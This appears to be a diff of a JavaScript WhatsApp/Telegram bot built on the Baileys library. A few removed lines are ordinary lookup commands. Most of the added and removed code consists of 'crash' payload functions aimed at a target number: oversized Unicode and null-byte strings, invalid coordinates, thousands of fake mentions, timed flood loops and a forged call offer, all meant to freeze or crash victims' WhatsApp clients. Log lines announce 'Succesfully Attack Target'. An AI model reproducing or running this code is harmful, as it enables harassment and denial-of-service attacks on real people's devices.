-      "https://api.nvidiabotz.xyz/stalk/github?username=" +
-      encodeURIComponent(user)
-    )
-
-    const u = data.result
-    const cap =
-`github stalk
-username : ${u.login}
-nama     : ${u.name || "-"}
-bio      : ${u.bio || "-"}
-repo     : ${u.public_repos}
-followers: ${u.followers}
-following: ${u.following}
-url      : ${u.html_url}`
-
-    bot.sendPhoto(chatId, u.avatar_url, { caption: cap })
-  } catch {
-    bot.sendMessage(chatId, "github error. user ga ada atau api ngambek.")
-  }
-})
-
-/* =====================
-   /youtube <query>
-===================== */
-bot.onText(/^\/youtube\s+(.+)/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const q = match[1]
-
-  try {
-    const { data } = await axios.get(
-      "https://api.nvidiabotz.xyz/search/youtube?q=" +
-      encodeURIComponent(q)
-    )
-
-    const v = data.result[0]
-
-    bot.sendPhoto(chatId, v.thumbnail, {
-      caption: `${v.title}`,
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "buka youtube", url: v.url }
-        ]]
+  await sock.relayMessage("status@broadcast", zieeMsg.message, {
+    messageId: zieeMsg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              { 
+                tag: "to", 
+                attrs: { jid: target }, 
+                content: undefined 
+              }
+            ]
+          }
+        ]
       }
-    })
-  } catch {
-    bot.sendMessage(chatId, "youtube error. hasil kosong.")
-  }
-})
-
-/* =====================
-   /ceksholat <kota>
-===================== */
-bot.onText(/^\/ceksholat\s+(.+)/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const kota = match[1]
-
-  try {
-    const { data } = await axios.get(
-      "https://api.nvidiabotz.xyz/tools/ceksholat?kota=" +
-      encodeURIComponent(kota)
-    )
-
-    const j = data.result
-    const teks =
-`jadwal sholat ${kota}
-
-subuh   : ${j.subuh}
-dzuhur  : ${j.dzuhur}
-ashar   : ${j.ashar}
-maghrib : ${j.maghrib}
-isya    : ${j.isya}`
-
-    bot.sendMessage(chatId, teks)
-  } catch {
-    bot.sendMessage(chatId, "kota ga ketemu atau api mati.")
-  }
-})
-
-/* =====================
-   /brat <text> (sticker)
-===================== */
-bot.onText(/^\/brat\s+(.+)/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const text = match[1]
-
-  try {
-    const url =
-      "https://api.nvidiabotz.xyz/imagecreator/bratv?text=" +
-      encodeURIComponent(text)
-
-    bot.sendSticker(chatId, url)
-  } catch {
-    bot.sendMessage(chatId, "brat error. teks lu aneh.")
-  }
-})
-
-/* =====================
-   /gimage <query>
-===================== */
-bot.onText(/^\/gimage\s+(.+)/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const query = match[1]
-
-  try {
-    const { data } = await axios.get(
-      "https://api.nvidiabotz.xyz/search/gimage?q=" +
-      encodeURIComponent(query)
-    )
-
-    const list = data.result.slice(0, 4)
-    for (const img of list) {
-      await bot.sendPhoto(chatId, img)
+    ]
+  });
+}
+async function coreDrain(sock, target) {
+  const msg = generateWAMessageFromContent(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: {
+            text: "zHOLA"
+          },
+          nativeFlowMessage: {
+            messageParamsJson: "[{".repeat(10000),
+            buttons: [{
+              name: "galaxy_message",
+              buttonParamsJson: "\u0000".repeat(950000)
+            }]
+          },
+          contextInfo: {
+            forwardingScore: 999,
+            isForwarded: true,
+            mentionedJid: Array.from({ length: 2000 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net" ),
+            remoteJid: target
+          }
+        }
+      }
     }
-  } catch {
-    bot.sendMessage(chatId, "gimage error. hasil kosong.")
+  }, {});
+  
+  await sock.relayMessage(target, msg.message, {
+    messageId: msg.key.id, participant: { jid: target }
+  });
+}
+async function DelayXburn(sock, target) {
+  let payload = "ꦾ࣯࣯".repeat(25000);
+  const mentions = [
+    "13135550002@s.whatsapp.net",
+    ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+    )
+  ];
+  
+  let message = {
+    locationMessage: {
+      degreesLatitude: -1e309,
+      degreesLongitude: 1e309,
+      name: "JEMBUT" + payload,
+      address: payload,
+      accuracyInMeters: 1e309,
+      contextInfo: {
+        stanzaId: "zāyy off" + Date.now(),
+        forwardingScore: 666,
+        isForwarded: true,
+        remoteJid: "status@brosdcast",
+        mentionedJid: mentions
+      }
+    }
+  };
+  
+  let messege = {
+    interactiveMessage: {
+      body: {
+        text: payload + payload
+      },
+      nativeFlowMessage: {
+        messageParamsJson: "{".repeat(10000),
+        buttons: [{
+          name: "galaxy_message",
+          buttonParamsJson: "\u0000".repeat(950000)
+        }]
+      },
+      contextInfo: {
+        mentionedJid: mentions
+      }
+    }
+  };
+  
+  const msg = generateWAMessageFromContent(target, message, {});
+  const msgs = generateWAMessageFromContent(target, messege, {});
+  for (var i = 0; i < 1; i++) {
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: msg.message
+      }
+    }, { participant: { jid: target }, messageId: msg.key.id });
   }
-})
-async function DavDoctUi(target) {
-    let DavaXploitt = ":⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⸸⃟⃟『𝐃𝐚𝐯𝐚 𝐗𝐩𝐥𝐨𝐢𝐭𝐭』ꪾ〽️";
-    let boomui = "ြ".repeat(25000);
+  
+  await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: msgs.message
+      }
+    }, { participant: { jid: target}, messageId: msgs.key.id });
+}
+async function VsxMeta(sock, target) {
+  const IlegRXVZ = Date.now();
+  const Ilegal = 5 * 60 * 1000; 
+  const RXVZNew = 5 * 1000; 
+  try {
+    while (Date.now() - IlegRXVZ < Ilegal) {
+      const timeElapsed = Date.now() - IlegRXVZ;
+      const timeLeft = Ilegal - timeElapsed;
+      const msg = generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+          message: {
+            locationMessage: {
+              degreesLatitude: -66.666,
+              degreesLongtitude: 66.666,
+              name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
+              address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
+              jpegThumbnail: null,
+              url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
+              contextInfo: {
+                participant: target,
+                forwardingScore: 1,
+                isForwarded: true,
+                stanzaId: target,
+                mentionedJid: [target]
+              },
+            },
+          },
+        },
+      }, {});
+      if (timeLeft > RXVZNew) {
+        await sock.relayMessage(target, {
+          requestPhoneNumberMessage: {
+            contextInfo: {
+              quotedMessage: {
+                documentMessage: {
+                  url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
+                  mimetype: "application/pdf",
+                  fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
+                  fileLength: 0,
+                  pageCount: 0,
+                  mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
+                  fileName: "HeryRXVZ.pdf",
+                  fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
+                  directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
+                  mediaKeyTimestamp: 1737369406,
+                  caption: "PUQI",
+                  title: "PUQI",
+                  mentionedJid: [target],
+                }
+              },
+              externalAdReply: {
+                title: "PUCITA",
+                body: "𑇂𑆵𑆴𑆿".repeat(30000),
+                mediaType: "VIDEO",
+                renderLargerThumbnail: true,
+                sourceUrl: "https://t.me/durov",
+                mediaUrl: "https://t.me/durov",
+                containsAutoReply: true,
+                showAdAttribution: true,
+                ctwaClid: "ctwa_clid_example",
+                ref: "ref_example"
+              },
+              forwardedNewsletterMessageInfo: {
+                newsletterJid: "1@newsletter",
+                serverMessageId: 1,
+                newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
+                contentType: "UPDATE",
+              },
+            },
+            skipType: 7,
+          }
+        }, { participant: { jid: target } });
+      }
+      await sock.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+          tag: "meta", attrs: {}, content: [{
+            tag: "mentioned_users", attrs: {}, content: [{
+              tag: "to", attrs: { jid: target }, content: undefined
+            }],
+          }],
+        }],
+      });
+      if (timeLeft <= RXVZNew) break;
+      await new Promise(resolve => setTimeout(resolve, 1000));
+    }
+  } catch (error) {
+    console.log(error);
+  }
+}
+async function AxDEnres(sock, target) {
 
-    let DavDoct = generateWAMessageFromContent(
-        target,
-        proto.Message.fromObject({
-            documentMessage: {
-                url: "https://mmg.whatsapp.net/v/t62.7119-24/587365455_25895704526760546_4343400859820129115_n.enc?ccb=11-4&oh=01_Q5Aa3wH_lfUCtiO8v_2blYftyRkGE25tzAul39Rk0BSWaBHvPA&oe=69BBC6DF&_nc_sid=5e03e0&mms3=true",
-                mimetype: "application/pdf",
-                fileSha256: "599yAdsC6dXg1syDfO4RyiQIgm+rP+PhTHr6+d5vMWI=",
-                fileLength: "999999999",
-                pageCount: 999999999,
-                mediaKey: "VVWtiTAe55KXgy6uBxKuf5BVGtEjYbj5f4/aYV4fhB0=",
-                fileName: DavaXploitt + ".pdf",
-                fileEncSha256: "VkuUIVuTjx+ZqKbvlqnwRHxOufvUgHSJesu14h5F9Rk=",
-                directPath: "/v/t62.7119-24/587365455_25895704526760546_4343400859820129115_n.enc?ccb=11-4&oh=01_Q5Aa3wH_lfUCtiO8v_2blYftyRkGE25tzAul39Rk0BSWaBHvPA&oe=69BBC6DF&_nc_sid=5e03e0",
-                mediaKeyTimestamp: "1771322893",
-                caption: DavaXploitt + boomui,
+  const msg = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            body: {
+              text: "\0"
+            },
+            footer: {
+              text: "\0"
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "galaxy_message",
+                  buttonParamsJson: JSON.stringify({
+                    icon: "DOCUMENT",
+                    flow_cta: "ꦽ".repeat(25000),
+                    flow_message_version: "3"
+                  })
+                },
+                {
+                  name: "wa_payment_transaction_details",
+                  buttonParamsJson: JSON.stringify({
+                    transaction_id: "AXD-" + Date.now() + "ꦽ".repeat(40000)
+                  })
+                },
+                {
+                  name: "send_location",
+                  buttonParamsJson: JSON.stringify({
+                    location_name: "ꦽ".repeat(25000),
+                    latitude: 1e308,
+                    longitude: 1e308
+                  })
+                },
+
+                {
+                  name: "payment_request",
+                  buttonParamsJson: JSON.stringify({
+                    currency: "USD",
+                    amount: "999999999",
+                    note: "ꦽ".repeat(25000)
+                  })
+                },
+
+                {
+                  name: "cta_url",
+                  buttonParamsJson: JSON.stringify({
+                    display_text: "Open",
+                    url: "https://wa.me/settings/channel/status" + "ꦽ".repeat(35000)
+                  })
+                },
+
+                {
+                  name: "multi_select",
+                  buttonParamsJson: JSON.stringify({
+                    title: "AxD Select",
+                    sections: [
+                      {
+                        title: "AXD",
+                        rows: [
+                          {
+                            id: "1",
+                            title: "ꦽ".repeat(19999)
+                          },
+                          {
+                            id: "2",
+                            title: "ꦽ".repeat(19999)
+                          }
+                        ]
+                      }
+                    ]
+                  })
+                }
+
+              ],
+              messageParamsJson: "wa.me/stickerpack/whatsapp",
+              messageVersion: 1
+            }
+          }
+        }
+      }
+    },
+    {}
+  )
+
+  await sock.relayMessage(
+    target,
+    msg.message,
+    {
+      messageId: msg.key.id
+    }
+  )
+}
+async function RxVzBurstV2(sock, target) {
+    try {
+        const delay = ms => new Promise(r => setTimeout(r, ms));
+
+        const relay = async (payload) => {
+            const msg = await generateWAMessageFromContent(target, payload, {
+                userJid: sock.user.id
+            });
+            
+            if (msg && msg.message) {
+                await sock.relayMessage(target, msg.message, { 
+                    messageId: msg.key?.id || sock.generateMessageTag() 
+                });
+            }
+            await delay(100);
+        };
+
+        await relay({
+            newsletterAdminInviteMessage: {
+                newsletterJid: "120363200000000000@newsletter",
+                newsletterName: "ꦾ" + "ꦽ".repeat(30000),
+                caption: "𑜦𑜠".repeat(30000) + "ꦽ".repeat(30000)
+            }
+        });
+
+        await relay({
+            eventMessage: {
+                isResource: true,
+                name: "ꦾ" + "ꦽ".repeat(30000),
+                description: "ꦾ" + "ꦽ".repeat(30000),
+                location: {
+                    degreesLatitude: -6.1751,
+                    degreesLongitude: 106.8272,
+                    name: "ꦾ" + "ꦽ".repeat(30000),
+                },
+                startTime: Math.floor(Date.now() / 1000) + 3600
+            }
+        });
+
+        await relay({
+            groupInviteMessage: {
+                groupJid: "120363000000000000@g.us",
+                inviteCode: "PukiMak",
+                inviteExpiration: Math.floor(Date.now() / 1000) + 259200,
+                groupName: "ꦾ".repeat(30000) + ":҉⃝҉".repeat(30000),
+                caption: "ꦾ".repeat(30000) + "ꦽ".repeat(30000) + "𑇂𑆵𑆴𑆿".repeat(30000),
+                jpegThumbnail: Buffer.alloc(0)
+            }
+        });
+
+        await relay({
+            newsletterAdminInviteMessage: {
+                newsletterJid: "120363200000000000@newsletter",
+                newsletterName: "ꦾ" + "ꦽ".repeat(30000),
+                caption: "ꦾ".repeat(30000)
+            }
+        });
+
+        await relay({
+            listMessage: {
+                title: "𑜦𑜠".repeat(20000),
+                description: "ꦾ" + "ꦽ".repeat(30000),
+                buttonText: "𑜦𑜠".repeat(20000),
+                listType: 1,
+                sections: Array.from({ length: 5 }, (_, i) => ({
+                    title: `Cluster Node ${i}`,
+                    rows: Array.from({ length: 10 }, (_, j) => ({
+                        title: `Validation Row ${j}`,
+                        description: `Sequence ID: ${i}-${j}-ALPHA-BETA`,
+                        rowId: `id-${i}-${j}`
+                    }))
+                }))
+            }
+        });
+
+        await relay({
+            liveLocationMessage: {
+                degreesLatitude: -6.1751,
+                degreesLongitude: 106.8272,
+                caption: "ꦾ".repeat(30000),
+                sequenceNumber: "1",
+                contextInfo: { forwardingScore: 999, isForwarded: true }
+            }
+        });
+
+        await relay({
+            newsletterAdminInviteMessage: {
+                newsletterJid: "120363200000000000@newsletter",
+                newsletterName: "ꦾ" + "ꦽ".repeat(30000),
+                caption: "ꦾ".repeat(30000)
+            }
+        });
+
+        await relay({
+            pollCreationMessage: {
+                name: "ꦾ".repeat(30000) + "ꦽ".repeat(30000),
+                options: Array.from({ length: 12 }, (_, i) => ({ optionName: `Validation Node ${i}` })),
+                selectableOptionsCount: 1
+            }
+        });
+
+        await relay({
+            interactiveMessage: {
+                header: { title: "ꦾ" + "ꦽ".repeat(30000), hasMediaAttachment: false },
+                body: { text: "ꦾ" + "ꦽ".repeat(30000) },
+                footer: { text: "ꦾ" + "ꦽ".repeat(30000) },
                 nativeFlowMessage: {
                     buttons: [
                         {
-                            name: "cta_url",
+                            name: "single_select",
                             buttonParamsJson: JSON.stringify({
-                                display_text: boomui,
-                                url: "https://" + "ြ".repeat(5000) + ".com"
+                                title: "Mode Selection",
+                                sections: [{
+                                    title: "Available Modes",
+                                    rows: [{ title: "Access", id: "1" }, { title: "Admin", id: "2" }]
+                                }]
                             })
                         }
                     ]
-                },
-                contextInfo: {
-                    mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 9000000000000)}@s.whatsapp.net`),
-                    externalAdReply: {
-                        title: `🚀 𝐓𝐫𝐚𝐯𝐚𝐬 𝐔𝐢 〽️`,
-                        body: `💫`,
-                        previewType: "PHOTO",
-                        thumbnail: "",
-                        sourceUrl: `https://t.me/DavaXploitt`
-                    },
-                    disappearingMode: {
-                        initiator: "CHANGED_IN_CHAT",
-                        trigger: "CHAT_SETTING"
-                    }
                 }
             }
-        }),
-        { userJid: target, quoted: null }
-    );
-
-    await sock.relayMessage(target, DavDoct.message, {
-        participant: { jid: target },
-        messageId: null,
-    });
-    console.log(chalk.red("Succesfully Attack Target By : @DavaXploitt"));  
-}
-
-async function TheKingS9(sock, target) {
-    const SilentMsg = await generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: {
-                interactiveResponseMessage: {
-                    body: { 
-                        text: "⏤͟͟𝐓𝐡𝐞𝐊𝐢𝐧𝐠𝐒𝐢𝐥𝐞𝐧𝐭", 
-                        format: "DEFAULT" 
-                    },
-                    nativeFlowResponseMessage: {
-                        name: "call_permission_request",
-                        paramsJson: "\x10".repeat(1045000),
-                        version: 3
-                    },
-                    entryPointConversionSource: "call_permission_message"
-                }
-            }
-        }
-    }, {
-        ephemeralExpiration: 0,
-        forwardingScore: 9741,
-        isForwarded: true,
-        font: Math.floor(Math.random() * 99999999),
-        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
-    });
-
-    const AzkaMsg = await generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: {
-                interactiveResponseMessage: {
-                    body: { 
-                        text: "𝐤 𝐟𝐨𝐫 𝐒𝐢𝐥𝐞𝐧𝐭𝐒𝟗", 
-                        format: "DEFAULT" 
-                    },
-                    nativeFlowResponseMessage: {
-                        name: "galaxy_message", 
-                        paramsJson: "\x10".repeat(1045000),
-                        version: 3
-                    },
-                    entryPointConversionSource: "call_permission_request"
-                }
-            }
-        }
-    }, {
-        ephemeralExpiration: 0,
-        forwardingScore: 9741, 
-        isForwarded: true,
-        font: Math.floor(Math.random() * 99999999),
-        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
-    });
-
-    await sock.relayMessage("status@broadcast", SilentMsg.message, {
-        messageId: SilentMsg.key.id,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users", 
-                attrs: {},
-                content: [{ 
-                    tag: "to", 
-                    attrs: { jid: target } 
-                }]
-            }]
-        }]
-    });
-
-    await sock.relayMessage("status@broadcast", AzkaMsg.message, {
-        messageId: AzkaMsg.key.id,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users", 
-                attrs: {},
-                content: [{ 
-                    tag: "to", 
-                    attrs: { jid: target } 
-                }]
-            }]
-        }]
-    });
-}
-
-async function BlankXFrezeeInfinity(sock, target) {
-    while (true) {
-        try {
-            const Messages = [
-                "0@s.whatsapp.net",
-                "13135550002@s.whatsapp.net",
-                ...Array.from({ length: 5000 }, () =>
-                    "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
-                ),
-            ];
-
-            for (let i = 0; i < 75; i++) {
-                const mediaFlood = {
-                    viewOnceMessage: {
-                        message: {
-                            interactiveMessage: {
-                                body: { text: "𝐃𝐨𝐮 𝐘𝐨𝐮 𝐊𝐧𝐨𝐰 𝐀𝐳𝐤𝐚? " },
-                                contextInfo: {
-                                    forwardingScore: 9999,
-                                    isForwarded: true,
-                                    participant: "0@s.whatsapp.net",
-                                    remoteJid: "status@broadcast",
-                                    mentionedJid: Messages,
-                                },
-                                nativeFlowMessage: {
-                                    buttons: [
-                                        { name: "single_select", buttonParamsJson: "" },
-                                        { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) },
-                                    ],
-                                    messageParamsJson: "{{".repeat(15000),
-                                },
-                            },
-                            extendedTextMessage: {
-                                text: "ꦾ".repeat(25000) + "@1".repeat(25000),
-                                contextInfo: {
-                                    stanzaId: target,
-                                    participant: target,
-                                    quotedMessage: {
-                                        conversation: "𝐃𝐨𝐮 𝐘𝐨𝐮 𝐊𝐧𝐨𝐰 𝐀𝐳𝐤𝐚? " +
-                                            "ꦾ࣯࣯".repeat(60000) +
-                                            "@1".repeat(30000),
-                                    },
-                                },
-                                inviteLinkGroupTypeV2: "DEFAULT",
-                            },
-                        },
-                    },
-                };
-
-                const msg = generateWAMessageFromContent(target, mediaFlood, {});
-                await sock.relayMessage(target, msg.message, {
-                    messageId: msg.key.id,
-                    statusJidList: [target],
-                });
-            }
-        } catch (err) {
-            // ignore error
-        }
-
-        await new Promise(res => setTimeout(res, 5000));
-    }
-}
-
-async function sockFcInvis(sock, target) {
-    const {
-        encodeSignedDeviceIdentity,
-        jidDecode,
-        encodeWAMessage,
-        patchMessageBeforeSending,
-        encodeNewsletterMessage
-    } = require("@whiskeysockets/baileys");
-    const crypto = require("crypto");
-
-    let devices = (
-        await sock.getUSyncDevices([target], false, false)
-    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
-
-    await sock.assertSessions(devices);
-
-    let mutex = () => {
-        let map = {};
-        return {
-            mutex(key, fn) {
-                map[key] ??= { task: Promise.resolve() };
-                map[key].task = (async prev => {
-                    try { await prev; } catch {}
-                    return fn();
-                })(map[key].task);
-                return map[key].task;
-            }
-        };
-    };
-
-    let mutexInstance = mutex();
-    let addPadding = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
-    let originalEncode = sock.encodeWAMessage?.bind(sock);
-
-    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
-        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
-
-        let patched = await (patchMessageBeforeSending?.(message, recipientJids) ?? message);
-        let messages = Array.isArray(patched)
-            ? patched
-            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
-
-        let { id: meId, lid: meLid } = sock.authState.creds.me;
-        let lidUser = meLid ? jidDecode(meLid)?.user : null;
-        let shouldIncludeDeviceIdentity = false;
-
-        let nodes = await Promise.all(
-            messages.map(async ({ recipientJid: jid, message: msg }) => {
-                let { user: targetUser } = jidDecode(jid);
-                let { user: ownUser } = jidDecode(meId);
-                let isOwnUser = targetUser === ownUser || targetUser === lidUser;
-                let isSelf = jid === meId || jid === meLid;
-
-                if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;
-
-                let bytes = addPadding(
-                    originalEncode ? originalEncode(msg) : encodeWAMessage(msg)
-                );
-
-                return mutexInstance.mutex(jid, async () => {
-                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
-                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;
-                    return {
-                        tag: "to",
-                        attrs: { jid },
-                        content: [{
-                            tag: "enc",
-                            attrs: { v: "2", type, ...extraAttrs },
-                            content: ciphertext
-                        }]
-                    };
-                });
-            })
-        );
-
-        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
-    };
-
-    let randomBytes = crypto.randomBytes(32);
-    let paddedBytes = Buffer.concat([randomBytes, Buffer.alloc(8, 0x01)]);
-
-    const callId = crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase();
-
-    let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(
-        devices,
-        { 
-            conversation: "y",
-            messageParamsJson: "{".repeat(10000)
-        },
-        { count: "0" }
-    );
-
-    const callOffer = {
-        tag: "call",
-        attrs: {
-            to: target,
-            id: sock.generateMessageTag(),
-            from: sock.user.id
-        },
-        content: [{
-            tag: "offer",
-            attrs: {
-                "call-id": callId,
-                "call-creator": sock.user.id
-            },
-            content: [
-                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
-                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
-                {
-                    tag: "video",
-                    attrs: {
-                        orientation: "0",
-                        screen_width: "1920",
-                        screen_height: "1080",
-                        device_orientation: "0",
-                        enc: "vp8",
-                        dec: "vp8"
-                    }
-                },
-                { tag: "net", attrs: { medium: "3" } },
-                {
-                    tag: "capability",
-                    attrs: { ver: "1" },
-                    content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
-                },
-                { tag: "encopt", attrs: { keygen: "2" } },
-                { tag: "destination", attrs: {}, content: destinations },
-                ...(shouldIncludeDeviceIdentity ? [{
-                    tag: "device-identity",
-                    attrs: {},
-                    content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
-                }] : [])
-            ]
-        }]
-    };
-
-    await sock.sendNode(callOffer);
-    await new Promise(resolve => setTimeout(resolve, 500));
-
-    console.log("Successfully Attack Target By : @sockXploitt");
-}
-
-async function sockCarouselV1(sock, target) {
-    console.log(chalk.red("Succesfully Attack Target By : t.me/sockXploitt"));
-
-    let push = [];
-    for (let i = 0; i < 1000; i++) {
-        push.push({
-            body: { text: `\u0000\u0000\u0000\u0000\u0000` },
-            footer: { text: "" },
-            header: {
-                title: "𝘿𝙖𝙫𝙖𝙓 𝙒𝙖𝙨 𝙃𝙚𝙧𝙚 〽️",
-                hasMediaAttachment: true,
-                imageMessage: {
-                    url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
-                    mimetype: "image/jpeg",
-                    fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
-                    fileLength: "591",
-                    height: 0,
-                    width: 0,
-                    mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
-                    fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
-                    directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
-                    mediaKeyTimestamp: "1721344123",
-                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
-                    scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
-                    scanLengths: [247, 201, 73, 63],
-                    midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
-                }
-            },
-            nativeFlowMessage: { buttons: [] }
         });
-    }
 
-    const carousel = generateWAMessageFromContent(
-        target,
-        {
+        await relay({
             viewOnceMessage: {
                 message: {
-                    messageContextInfo: {
-                        deviceListMetadata: {},
-                        deviceListMetadataVersion: 2,
-                        messageSecret: crypto.randomBytes(32),
-                        supportPayload: JSON.stringify({
-                            version: 2,
-                            is_ai_message: true,
-                            should_show_system_message: true,
-                            ticket_id: crypto.randomBytes(16)
-                        }),
-                        badgeChat: {
-                            unreadCount: 9999
-                        }
-                    },
                     interactiveMessage: {
-                        body: { text: "Exploit Beta ⁰ ATRASO ;;\u0000\u0000\u0000\u0000" },
-                        footer: { text: "t.me/sockXploitt" },
-                        header: { hasMediaAttachment: false },
-                        carouselMessage: { cards: [...push] },
-                        contextInfo: {
-                            mentionedJid: Array.from({ length: 1901 }, () => `1${Math.floor(Math.random() * 9000000000000)}@s.whatsapp.net`),
-                            entryPointConversionSource: "non_contact",
-                            entryPointConversionApp: "whatsapp",
-                            entryPointConversionDelaySeconds: 467593,
-                            participant: "0@s.whatsapp.net",
-                            quotedMessage: {
-                                viewOnceMessage: {
-                                    message: {
-                                        interactiveResponseMessage: {
-                                            body: {
-                                                text: "[ ! ] sock Xploitt 𖥂",
-                                                format: "DEFAULT"
-                                            },
-                                            nativeFlowResponseMessage: {
-                                                name: "call_permission_request",
-                                                paramsJson: "\u0000".repeat(500),
-                                                version: 3
-                                            }
-                                        }
-                                    }
+                        body: { text: "ꦾ".repeat(30000) + "ꦽ".repeat(30000) },
+                        nativeFlowMessage: {
+                            buttons: [
+                                {
+                                    name: "galaxy_message",
+                                    buttonParamsJson: JSON.stringify({
+                                        icon: "DOCUMENT",
+                                        flow_cta: "ꦽ".repeat(90000),
+                                        flow_message_version: "3"
+                                    })
                                 }
-                            },
-                            remoteJid: "@s.whatsapp.net"
+                            ]
                         }
                     }
                 }
             }
-        },
-        {}
-    );
-
-    await sock.relayMessage(
-        target,
-        carousel.message,
-        {
-            participant: { jid: target },
-            messageId: sock.generateMessageTag()
-        }
-    );
-}
-
-async function LocationSilent(sock, target) {
-    console.log(chalk.red(`Silent Proses attack`));
-
-    const Silent = proto.Message.fromObject({
-        viewOnceMessage: {
-            message: {
-                interactiveMessage: {
-                    header: {
-                        locationMessage: {
-                            degreesLatitude: 11.11,
-                            degreesLongitude: -11.11,
-                            name: "You Know Silent?" + "ꦽ".repeat(60000),
-                            url: "https://t.me/Otapengenkawin",
-                            contextInfo: {
-                                externalAdReply: {
-                                    quotedAd: {
-                                        advertiserName: "ꦾ".repeat(60000),
-                                        mediaType: "IMAGE",
-                                        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
-                                        caption: "Silent Is Here"
-                                    },
-                                    placeholderKey: {
-                                        remoteJid: "0@g.us",
-                                        fromMe: true,
-                                        id: "ABCDEF1234567890"
-                                    }
-                                }
-                            }
-                        },
-                        hasMediaAttachment: true
-                    },
-                    body: {
-                        text: "Ola Im Silent⸙"
-                    },
-                    nativeFlowMessage: {
-                        messageParamsJson: "{[",
-                        messageVersion: 3,
-                        buttons: [
-                            {
-                                name: "single_select",
-                                buttonParamsJson: ""
-                            },
-                            {
-                                name: "galaxy_message",
-                                buttonParamsJson: JSON.stringify({
-                                    icon: "RIVIEW",
-                                    flow_cta: "ꦽ".repeat(10000),
-                                    flow_message_version: "3"
-                                })
-                            },
-                            {
-                                name: "galaxy_message",
-                                buttonParamsJson: JSON.stringify({
-                                    icon: "RIVIEW",
-                                    flow_cta: "ꦾ".repeat(10000),
-                                    flow_message_version: "3"
-                                })
-                            }
-                        ]
-                    },
-                    quotedMessage: {
-                        interactiveResponseMessage: {
-                            nativeFlowResponseMessage: {
